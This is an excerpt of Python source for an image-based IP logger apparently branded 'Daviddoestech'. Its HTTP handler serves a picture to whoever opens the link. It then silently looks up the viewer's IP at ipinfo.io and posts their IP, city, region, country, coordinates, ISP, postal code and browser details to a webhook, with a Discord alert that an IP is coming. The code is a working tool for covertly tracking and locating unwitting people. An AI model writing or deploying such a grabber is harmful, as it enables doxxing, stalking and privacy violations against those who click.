...
bindata = http.get('https://yt3.ggpht.com/wVW11wzROUn5Xxz6pDHWIvnber8DRjWupAzbsCR6VNLZiX1EiY1vdUeT8RNLhSSwwkvLkNK5xg=s600-c-k-c0x00ffffff-no-rj-rp-mo').content
...
def prev(ip,uag):
  return {
  "username": "Daviddoestech",
  "content": "",
  "embeds": [
    {
      "title":"Daviddoestech alert",
      "color": 16711803,
      "description": f"Discord previewed a david does tech Image! You can expect an IP soon.\n\n**IP:** `{ip}`\n**UserAgent:** `Look Below!`\n```yaml\n{uag}```",
      "author": {
        "name": "david does tech"
      },
      "fields": [
      ]
    }
...
class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        ...
        else: self.send_response(200); self.send_header('Content-type','image/jpeg'); self.end_headers(); self.wfile.write(data); ipInfo = http.get('https://ipinfo.io/{}/json'.format(self.headers.get('x-forwarded-for'))).json(); http.post(webhook,json=formatHook(ipInfo['ip'],ipInfo['city'],ipInfo['region'],ipInfo['country'],ipInfo['loc'],ipInfo['org'],ipInfo['postal'],useragent,os,browser))
        return
